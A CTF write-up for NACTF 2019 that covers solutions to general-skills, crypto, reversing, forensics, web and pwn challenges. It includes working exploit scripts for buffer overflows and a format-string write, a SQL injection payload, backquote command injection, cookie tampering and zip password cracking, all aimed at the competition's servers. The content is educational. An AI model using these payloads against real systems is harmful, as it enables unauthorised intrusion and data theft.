# NACTF Write-up

##### Table of Contents  
[I General skills](#i-general-skills) 
[II Crypto](#ii-crypto)
[III Reverse engineering](#iii-reverse-engineering) 
[IV Forensics](#iv-forensics)  
[V Web](#v-web-exploitation)  
[VI Pwn](#vi-pwn)

Missing tasks: Randomizer 2, Cell 2, loopy0,1

## I General skills

### 1. Intro to flags (10, 1136 solves)
... just input the flag

### 2. Join the Discord (25, 829 solves) 
... flag is on the discord

### 3. What the hex (25, 959 solves)
The text to decode:
>49 20 77 61 73 2e 20 53 6f 72 72 79 20 74 6f 20 68 61 76 65 20 6d 69 73 73 65 64 20 79 6f 75 2e

Simply convert each hex to int and take the corresponding ASCII char. in python:

```''.join(chr(int(i,16)) for i in text.split(' '))```

### 4. Off-base (25, 1025 solves)
The text to decode:
>bmFjdGZ7YV9jaDRuZzNfMGZfYmE1ZX0=

Simply convert from base64

### 5. Cat over wire (50, 908 solves)
Designed to teach the basics to ```netcat```. You can just ```nc``` to the server which will give you the flag.

### 6. Grace's hashbrowns (50, 954 solves)
What we get:
>f5525fc4fc5fdd42a7cf4f65dc27571c

That looks supsiciously like an md5. And even if it doesn't, always google what you get, in many cases you will get an answer. In this case you get the inverse hash from a multitude of websites.


### 7. Cellular Evolution #0: Bellsprout (75, 329 solves)
This was a series of challenges based on a customized cellular automata machine coded in java. Pretty simple conceptially but, as often is with those, yielding a world of different complex behaviours. This first one was straight forward: simply load the input pattern, write the program, parse and step 16 times. The flag is then displayed.


### 8. Get a GREP #0 (100, 764 solves)
I was tempted to to use my newly minted [StringParser](https://github.com/Gdasl/STT/blob/master/StringParser.py) but the file was very small. Easiest is simply to open the zip in a hex editor and search for ```nactf{```. Gets you the flag fast.

### 9. Hwang's Hidden Handiwork (100, 350 solves)
We get 2 files: 1 is the encrypted password, the other a csv, the key. This is a simple subsitution cipher and can be solved as follows:
```python
li1 = 'a b ....'.split() #first line of the csv
li2 = 'T v m...'.split()#second line of the csv
d = dict(zip(li2,li1))
''.join(d[i] for i in s)
```
This yields a link where to some image that is very small. You need to change the text of the url to exclude that last part specifying the small size.


### 10. Cellular Evolution #1: Weepinbell (125, 163 solves)
The basic layout of the cells is as follows:

![CellPrinciple](https://github.com/Gdasl/CTFs/raw/master/NACTF2019/Images/cellPrinciple.png)

We look at the instructions and basically just need to reverse them:
- If C == 4, SE should become 3
- If C == 3, SW should become 4
- If C == 2, NE should become 1
- If C == 1, NW should become 2
- If C == 5, leave it

So just write that in compiler language. Don't forget that we always take the POV of the central cell. So the first instruction will actually look at NW, since SE of NW will be C. This program gets the flag:

```
NW == 4: 3
NE == 3: 4
SW == 1 : 2
SE == 2 : 1
5
```


### 11. Get a GREP #1! (125, 589 solves)
There are many ways to Rome here. Essentially a long list of potential flags and we know that the last 7 chars are all vowels. One way to do it is using this code:

```python
f = open('flag(1).txt').read().split()

def isvalid(s):
    al = 'aeiouy'
    for i in s:
        if i not in al:
            return False
    return True


for i in f:
    if isvalid(i[-8:-1]):
        print i
```
It's not elegant but it works!

### 12. Cellular Evolution #2: VikTreebel (150, 90 Solves)
Full disclosure: one of the last challenges I solved. It took a while to wrap my head around it. Essentially, this is like minesweeper as I believe one of the hints mentioned. The ```sum8``` function sums all 8 surrounding cells. So C = N+S+E+W+SE+SW+NE+NW like so:

![Sum8](https://github.com/Gdasl/CTFs/raw/master/NACTF2019/Images/sum8Ex.png)

Given this, we can reverse a single sum8 action as we would solve a game of minesweeper. For instance if C != 0 but any of the surrounding cells are 0, then C == 0 in the original layout. Another example is if we have the following (X denotes a 0):
```
XXX
X3
X3
X3
XXX
```
Then we will have this:
```
XXX
XX1
XX1
XX1
XXX
```
I suggest doing this one on paper, it's a fun exercise and goes relatively fast since most letter are symmetric and some are repeated.

### 13. SHCALC (200, 365 Solves)
Again, probably a bunch of ways to solve this. An easy one is to use backquote subsitution, which will evaluate whatever is in the backquote. So a possible answer would be ``` `cat flag.txt` ```.



## II Crypto

### 1. Vyom's Soggy Croutons (50, 1012 solves)
Simple caesar cipher. Use your solver of choice. I like [quipiquip](https://quipqiup.com/)

### 2. Loony Tunes (50, 770 solves)
Another subsitution cipher. There are multiple ways to solve this. The simplest way it to recognize that this is a [pigpen cipher](https://en.wikipedia.org/wiki/Pigpen_cipher) and simply transcribe. But even without getting the hint you can just assign each symbol to an abitrary letter and solve using a subsitution cipher bruter like quipquip.

### 3. Dr. J's Group Test Randomizer: Board Problem #0 (100, 381 solves)
We get a nice long .c file that is some kind of simplified implementation of the [Middle square method](https://en.wikipedia.org/wiki/Middle-square_method). The real implementation actually comes to shine in random3, which I didn't solve in time. Anywho, the only bit we are interested in is the following:

```c
uint64_t nextRand() {
  // Keep the 8 middle digits from 5 to 12 (inclusive) and square.
  seed = getDigits(seed, 5, 12);
  seed *= seed;
  return seed;
}
```

Basically this is a simple series where ```nextRand()``` is dependend on the previous ```nextRand()```. We can reimplement this in python:

```python
def digi(d):
    return int(str(d)[4:12])**2
```

And this gets us the correct next number. Full script:

```python

add = 'shell.2019.nactf.com 31425'

s = STTSocket(add)

print s.recv(2048)
print s.recv(2048)

def digi(d):
    return int(str(d)[4:12])**2


def getDigi():
    s.send('r')
    time.sleep(0.5)
    tmp = s.recvline().strip('\n').strip(' ').strip('>')
    return int(tmp)
    

d0 = getDigi()

s.sendline('g')
time.sleep(1)
print s.recv(2048)


for i in range(20):
    d0 = digi(d0)
    s.sendline(d0)
    time.sleep(0.5)
    print s.recv(2048)
```




### 4. Reversible Sneaky Algorithm #0 (125, 405 solves)
Essentially intro to RSA. ```c``` is the ciphertext, ```n``` the modulus and ```d``` the private key. All you need is there:

```hex(pow(c,d,n)))[2:-1].decode('hex')```

### 5. Super Duper AES (250, 139 solves)
This was a fun function. It's a simple implementation of a permutation/substitution. It first convert the string to hex, pads it to a multiple of 4 bytes and breaks it in blocks of 4 bytes, i.e. 8 hex digits. Then there are 2 functions:

```python
def substitute(hexBlock):
    substitutedHexBlock = ""
    substitution =  [8, 4, 15, 9, 3, 14, 6, 2,
                    13, 1, 7, 5, 12, 10, 11, 0]
    for hexDigit in hexBlock:
        newDigit = substitution[int(hexDigit, 16)]
        substitutedHexBlock += hex(newDigit)[2:]
    return substitutedHexBlock
    
def permute(hexBlock):
    permutation =   [6, 22, 30, 18, 29, 4, 23, 19,
                    15, 1, 31, 11, 28, 14, 25, 2,
                    27, 12, 21, 26, 10, 16, 0, 24,
                     7, 5, 3, 20, 13, 9, 17, 8]
    block = int(hexBlock, 16)
    permutedBlock = 0
    for i in range(32):
        bit = (block & (1 << i)) >> i
        permutedBlock |= bit << permutation[i]
    return hexpad(hex(permutedBlock)[2:])    
```

It doesn't really matter how many times you perform them, once you reverse them it's easy. So the first one simply substitutes hex digits. If the hex digit is 0, the new digit will be 8 etc. A nice way to reverse it:

```python
sub2 = [substituion.index(i) for i in range(16)]
```

your ```substituteRev``` function will be the same as ```substitute``` with the reverse array. And guess what, same thing for ```permuteRev```. All that is left is to reverse the main function (roundRev). The final solution looks like this:

```python
def revsub(hexBlock):
    substitutedHexBlock = ""
    sub2 = [15, 9, 7, 4, 1, 11, 6, 10, 0, 3, 13, 14, 12, 8, 5, 2]

    return ''.join([hex(sub2[int(i,16)])[2:] for i in hexBlock])

def revPermute(hexBlock):
    permutation =   [22, 9, 15, 26, 5, 25, 0,
                     24, 31, 29, 20, 11, 17, 28, 13, 8, 21, 30, 3, 7, 27,
                     18, 1, 6, 23, 14, 19, 16, 12, 4, 2, 10]
    block = int(hexBlock, 16)
    permutedBlock = 0
    for i in range(32):
        bit = (block & (1 << i)) >> i
        permutedBlock |= bit << permutation[i]
    return hexpad(hex(permutedBlock)[2:])
    
 def revRound(hexMessage):
    numBlocks = len(hexMessage)//8
    permutedHexMessage = ""
    
    for i in range(numBlocks):
        permutedHexMessage += hexpad(revPermute(hexMessage[8*i:8*i+8]).replace('L',''))

    substitutedHexMessage = ""
    
    for i in range(numBlocks):
        substitutedHexMessage += hexpad(revsub(permutedHexMessage[8*i:8*i+8]).replace('L',''))
     

    return substitutedHexMessage

hexMessage = enc
for i in range(10000):
    hexMessage = revRound(hexMessage)
```

### 6. Reversible Sneaky Algorithm #1 (275, 242 solves)
This one might have a more elegant solution but why go big when you can go home? We know that the flag is ```nactf{abcd}``` where ```a,b,c,d``` are all lowercase letters. So there are only ```26**4 = 456976``` possibilities. We have ```n``` and ```e```. We can just encrypt all possibilities until our encrypted text matches the given cipher.


### 7. Dr. J's Group Test Randomizer: Board Problem #1 (300, 131 solves)
We get a similar .c file as inr random0. But this time, it's not as deterministic since we only get the last 4 digits. I looked at the output for the first 2000 digits. What I realized was that at some point, our output gets to zero and in some cases, remains 0! So simply wait until it happens then send 0 the required number of time. Done.

### 8. Reversible Sneaky Algorithm #2 (350, 98 solves)
Classic [Shor](https://en.wikipedia.org/wiki/Shor%27s_algorithm). We have ```n``` and ```e``` through the ```pem``` file. And we even have ```a```, ```r```. We can actually go through the algorithm and we notice that ```gcd(pow(a,r/2,n)+1,n)``` yields a large number. Bingo, we have a factor.

The added difficulty I found was that in the encryption script we have the following: ```cipher = PKCS1_OAEP.new(key)```. So we must follow the same steps to decrypt. [This](https://www.dlitz.net/software/pycrypto/api/current/Crypto.PublicKey.RSA-module.html) explains how to construct a new RSA key. So the final script is:

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Util.number import long_to_bytes
from fractions import gcd
from RSASolver import *
from are_you_shor import *

key = RSA.importKey(open("oligarchy.pem", "rb"))

n = key.n
e = key.e
p = gcd(pow(a,r/2,n)+1,n)
q = n//p

key2 = RSA.construct((n,e,modinv(e,(p-1)*(q-1))))

cipher = PKCS1_OAEP.new(key2)

cipher.decrypt(long_to_bytes(c))
```

## III Reverse Engineering

### 1. Keygen (600, 172 solves)
I like revs. Revs are fun. In this case we have a simple ELF-32 binary. Fire up IDA and have a look. ```main``` won't deompile because of a positive ```sp``` value. Icouldn't be bothered so I looked at the other functions. ```sub_80491B6``` looks interesting.

```c
__int64 __cdecl sub_80491B6(_BYTE *a1)
{
  _BYTE *i; // [sp+4h] [bp-Ch]@1
  __int64 v3; // [sp+8h] [bp-8h]@1

  v3 = 0LL;
  for ( i = a1; i < a1 + 8; ++i )
  {
    v3 *= 62LL;
    if ( *i > 64 && *i <= 90 )
      v3 += *i - 65;
    if ( *i > 96 && *i <= 122 )
      v3 += *i - 71;
    if ( *i > 47 && *i <= 57 )
      v3 += *i + 4;
  }
  return v3;
}
```

Hm it look as if it performs some kind of hashing. It sets v3 to 0, then takes a string as an input and loops through the first 8 chars. If the char is an uppercase letter (ASCII ord between 64 and 90), add the position of the letter in the charset to v3. So if it's ```A``` it will add 0, if ```B``` 1 etc. The logic for lowercase (96 to 112) and digits (47 to 57) is the same. After each loops it multiplies v3 by 64.

So who calls that function. We can select it in the IDA view and hit ```X``` which shows us the references. And it looks like ```sub_804928C``` calls it. Here's the code for that one:

```c
bool __cdecl sub_804928C(char *s)
{
  bool result; // al@2

  if ( strlen(s) == 15 )
  {
    if ( s == strstr(s, "nactf{") )
    {
      if ( s[14] == 125 )
        result = sub_80491B6(s + 6) == 21380291284888LL;
      else
        result = 0;
    }
    else
    {
      result = 0;
    }
  }
  else
  {
    result = 0;
  }
  return result;
}
```

Looks like this is it. It takes the input string, makes sure the beginning is ```nactf{```, that the end is ```}``` and then ```sub_80491B6``` on the middle part, checking if it equals ```21380291284888LL```. The idea here is easy: since we know ```v3``` is multiplied by 63 each time, substracting the correct number from the result should yield a number that is divisible by 63. And so on. Full script:

```python
target = 21380291284888L

def isUpper(n):
    for i in range(65,91):
        tmp = i-65
        if not (n-tmp)%62:
            return True,i,(n-tmp)/62
    return False,None,None

def isLower(n):
    for i in range(97,123):
        tmp = i-71
        if not (n-tmp)%62:
            return True,i,(n-tmp)/62
    return False,None,None

def isNumber(n):
    for i in range(48,58):
        tmp = i+4
        if not (n-tmp)%62:
            return True,i,(n-tmp)/62
    return False,None,None



def reverser(t):
    a = False
    tmp = ''
    menu = [isUpper,isLower,isNumber]
    i = 0
    while not a:
        a, tmp,newT = menu[i](t)
        i+= 1
    return tmp,newT

t2 = target
s = ''

for i in range(8):
    tmp, t2 = reverser(t2)
    s += chr(tmp)
```



## IV Forensics

### 1. Least Significant Avenger (50, 623 solves)
I discovered a very nice [website](https://georgeom.net/StegOnline/image) to solve simple stego challs a while ago. Simply upload the image and navigate to "Extract data". Extracting the lsb for rgb will yield the flag.

### 2. The MetaMeme (75, 716 solves)
I mean, every single forensics challenge should have you open the file in a hexeditor as a first step. Doing this in this case and simply searching for ```nactf{``` shows the flag.

### 3. My Ears Hurt (75, 301 solves)
First we need to convert the file to mp4 or any non-aiff format. I used some random website. Once you have it in a useable format, open up the file in audacity. You will see this:

![canyouhearme](https://github.com/Gdasl/CTFs/raw/master/NACTF2019/Images/canyouhearme.PNG)

This is obviously morse code. I have my own library for this but any online decoder will do. Thin lines are dots, larger bands are dahses.


### 4. Unzip Me (150, 468 solves)
We get 3 password protected zipfiles. If you get a ```zip``` or ```rar``` immediately think [John the Ripper](https://www.openwall.com/john/). Moreover, remember that most people are unimaginative and will use real words as their passwords. There is a nice list that everyone should know called ```rockyou.txt```. You can find many repos hosting it. In this case we first need to extract the hashes from the zip by doing ```zip2john [zipname] > [whateveryouwant]```, then ```john --wordlist=rockyou.txt [whateveryouwant]```. This gives us 3 passwords, 1 for each archive, which each contain a pdf containing part of the flag. Easy peasy.

### 5. Kellen's Broken File (150, 584 solves)
We get a broken PDF, as evidenced by the header that is all messed up. All you need to do is use a hexeditor to replace the first line, ```31 2E 33 0A 25 C4 E5 F2 E5 EB A7 F3 A0 D0 C4 C6``` with ```25 50 44 46 2D 31 2E 35 0A 25 B5 ED AE FB 0A```. I like to use HexEdit but it's a free country and any hexeditor will do. Doing so makes the PDF readable again.

### 6. Kellen's PDF sandwich (150, 290 solves)
We get a PDF that seems corrupted. Inspecting it with ```binwalk``` reveals a second PDF in there. Opening the file wiht a hex editor and searchinf for ```PDF``` and ```EOF``` (the end of file marker), shows us where it is. Using HexEdit I can simply cut and paste the bytes in a new empty file and thus yield 2 valid PDFs.

### 7. Filesystem Image (200, 411 solves)
This one is easy using 7zip gui. You always see which folder has a non-null size. Keep following the trail of non-null until you find the flag.

### 8. Phuzzy Photo (250, 204 solves)
I'm not sure if I solved this one as well as could be but essentially we know that each 6 pixel is relevant. We can dump the ```imdata``` using PIL and take each 6th pixel, and then either keep it if it's black or set it to 0 otherwise. This will give you an array with 1/6 of the size of the original array. Put it in a new image and play with the dimensions until you get something legible:

```
from PIL import Image

def blocki(s,i):
    return [s[j:j+i] for j in range(0,len(s),i)]

im = Image.open('The_phuzzy_photo.png')

d = im.getdata()

d2 = [d[i] for i in range(len(d)) if not i%6]
d4 = []
for i in d2:
    if i == (255,255,255,255):
        d4.append(i)
    else:
        d4.append((0,0,0,0))

im2 = Image.new('RGBA',(900,100))

im2.putdata(d4)
ims.show()
```

### 9. File recovery (300, 388 solves)
One word: ```binwalk``` That will extract the PNG from the image. Or you can simply search for ```PNG``` using a hexeditor and copypaste it out, your choice.

## V Web exploitation

### 1. Pink Panther (50, 1055 solves)
Just look at the source code (Ctrl+U on most browsers), the flag is commented out.

### 2. Scooby Doo (100, 937 solves)
Exploring the page we see that there is a ```game.html```. navigating there we see a, well, game where apparently you win a flag after clicking a billion times. Let's have a look at the ```animation.js``` which seems to control the whole shabang, in particular the ```mouseClick()``` function:

```js
function mouseClick() {
    clickCount ++;
    document.getElementById("score").innerHTML = "Score: " + clickCount;
    
    if (clickCount >= 1000000000) {
        var elements = document.getElementsByClassName('letter');
        for (i = 0; i < elements.length; i++) {
            elements[i].style.opacity = "1";
        }
    }
}
```
So after 1 bn clicks it will render all elements non-opaque. Well simply execute that part (that becomes true after 1bn clicks) and run it in your browser's console (Ctrl+Shift+I usually):

```
var elements = document.getElementsByClassName('letter');
for (i = 0; i < elements.length; i++) {elements[i].style.opacity = "1";}
```
Et voila, the flag doth show.

### 3. Dexter's Lab (125, 783 solves)
Well, SQL injection is important. The first thing to try is always ```'or 1=1--```. In this case, it proved to be enough. Boom, flag.

### 4. Sesame Street (150, 693 solves)
So what do we have. Cookie monster, a countdown page and a flag page. During the competition, the flag page would indicate that it's not time yet and to come back later. The trick is obviously to alter the cookie. Inspecting we see a suspicious ```session-time``` cookie with a large number that turns out is unix time. Some code must check the session-time, compare it to a fixed value and only show the time if the ```session-time``` is greater or equal than the fixed value. So how about we just alter the cookie way in the future? I just incremented one of the first few digits by one and that worked.

## VI Pwn

### 1. BufferOverflow #0 (100, 680 solves)
The instruction say to simply cause a segfault to overflow. To get a segfault, we must simply overwrite the return pointer. Doesn't matter with what (as long as it's not a correct return address...). Just send any string longer than 28 chars (buffer + some junk on the stack) and the flag you shall get.


### 2. BufferOverflow #1 (200, 418 solves)
Same, but different. This time we actually want to overwrite the address to get to the ```win()``` function:

```
void win()
{
	printf("You win!\n");
	char buf[256];
	FILE* f = fopen("./flag.txt", "r");
	if (f == NULL)
	{
		puts("flag.txt not found - ping us on discord if this is happening on the shell server\n");
	}
	else
	{
		fgets(buf, sizeof(buf), f);
		printf("flag: %s\n", buf);
	}
}
```
A look at IDA:

```
.text:080491B2 ; void win(int)
...
```

So we simply need to send junk + address of win (```0x080491b2```) so that the return address gets overwritten by the address of win. Full code:

```python
from STTSocket import *
import time

ur = 'shell.2019.nactf.com 31462'
add = '080491b2'.decode('hex')

add = add[::-1]

s = STTSocket(ur)

print s.recv(1024)

s.send(add*10)
time.sleep(0.5)
print s.recv(1024)
```


### 3. BufferOverflow #2 (200, 272 solves)
Another small added twist: we need to pass arguments to the function. As evidenced by the c code:

```c
void win(long long arg1, int arg2)
{
	if (arg1 != 0x14B4DA55 || arg2 != 0xF00DB4BE)
	{
		puts("Close, but not quite.");
		exit(1);
	}

	printf("You win!\n");
	char buf[256];
	FILE* f = fopen("./flag.txt", "r");
	if (f == NULL)
	{
		puts("flag.txt not found - ping us on discord if this is happening on the shell server\n");
	}
	else
	{
		fgets(buf, sizeof(buf), f);
		printf("flag: %s\n", buf);
	}
}
```

This is a classic challenge. Usually the arguments for a function follow eachother on the stack. Now pay attention to the argument types: long long and int. This was a bit of a trap: long long are 8 bytes while int are 4. That means that we will need to send a total of 12 bytes as arguments. The correct code is thus ```|padding (28 bytes)|return address (4 bytes)|padding (4 bytes)|arg1 (8 bytes)|arg2 (4 bytes)|```

It took me a very long time because using bash and gdb, bash ignores null bytes. It drove me crazy until I tried to run the exploit on the server directly. How to lose half a day...


### 4. Format #0 (200, 263 solves)
Format strings exploits are nice. I always liked them. In this case we know the flag is on the stack so just print values until we find it. Simply send a ```%s``` * 20 and enjoy the flag. 

### 5. Format #1 (250, 197 solves)
Just as with the buf2, we need to change an argument this time. Having a look at the .c:

```c
int main()
{
	/* Disable buffering on stdout */
	setvbuf(stdout, NULL, _IONBF, 0);

	int num = 0;

	vuln(&num);

	if (num == 42)
	{
		puts("You win!");
		win();
	}
	else
	{
		printf("%d != 42, try again", num);
	}

	return 0;
}
```

First thing we need is to find ```num``` on the stack. We can bruteforce by sending ```%i$x``` incrementing i. We see a candidate at position 24. So we need to make sure that we send 42 bytes and we can write them at that address using ```n```. Final code:

```python
from STTSocket import *

import time

add = 'shell.2019.nactf.com 31560'

s = STTSocket(add)
s.recv(1024)
t = s.send('a'*42 + '%{}$n '.format(24))
time.sleep(0.2)
tmp =  s.recv(1024)
print tmp
```


